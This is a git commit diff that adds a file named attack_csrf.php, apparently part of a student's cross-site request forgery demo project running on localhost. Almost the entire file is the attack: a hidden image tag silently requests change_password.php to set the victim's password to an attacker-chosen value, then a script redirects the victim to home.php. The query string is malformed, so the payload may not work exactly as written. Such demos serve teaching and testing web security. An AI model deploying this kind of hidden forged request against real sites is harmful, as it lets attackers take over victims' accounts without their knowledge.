93ebd53d41ad227b519c4cb2c70ac8823df0c10b
RichArdila <139007449+RichArdila@users.noreply.github.com>
2023-08-10 17:31:14 -0400

    Add files via upload

--- attack_csrf.php
+++ attack_csrf.php
@@ -1,1 +1,18 @@
-hola a todos
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Attack CSRF - Change Password</title>
+</head>
+<body>
+  <h1>Attack - Change Password</h1>
+
+  <img src="http://localhost/CSRF_Project/change_password.php?password=NewPasswordAttacker?cpassword=NewPasswordAttacker" alt="Attack CSRF" style="display:none">
+
+  <script>
+    // Redireccionar a la víctima después de realizar la solicitud invisible
+    setTimeout(function() {
+      window.location.href = "home.php";
+    }, 2000);
+  </script>
+</body>
+</html>
